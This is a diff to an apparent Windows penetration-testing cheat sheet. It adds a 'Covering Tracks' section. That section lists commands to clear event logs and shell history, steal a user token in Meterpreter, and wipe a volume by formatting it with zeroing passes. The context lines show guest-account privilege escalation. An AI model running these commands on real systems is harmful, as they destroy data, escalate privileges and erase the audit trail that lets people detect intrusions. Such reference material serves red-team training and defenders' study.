@@ -63,3 +63,11 @@ You can search for services that have this vulnerability using:
 | Set/change the guest password to Pa22w0rd | net user guest Pa22w0rd |
 | Add guest to the local administrators group | net localgroup administrators /add guest |
 | View the SID of each account | wmic useraccount get name,sid |
+
+### Covering Tracks
+* ```wevtutil cl Application``` Clear individual log categories such as the application log.
+* ```clearev``` Clear all Windows event logs.
+* ```steal_token <PID>``` Steal a Windows user's token in Meterpreter. Where <PID> is the process ID of a process that is owned by the user whose token you want to steal.
+* ```Clear-History ``` Clear PowerShell history.
+* Pressing ```ALT+7``` will clear cmd.exe history or simply terminating the process.
+* ```format d: /fs:NTFS /p:1``` Overwrite an entire volume with zeros by formatting the volume.  The /p switch indicates how many passes the zeroing operation will do.
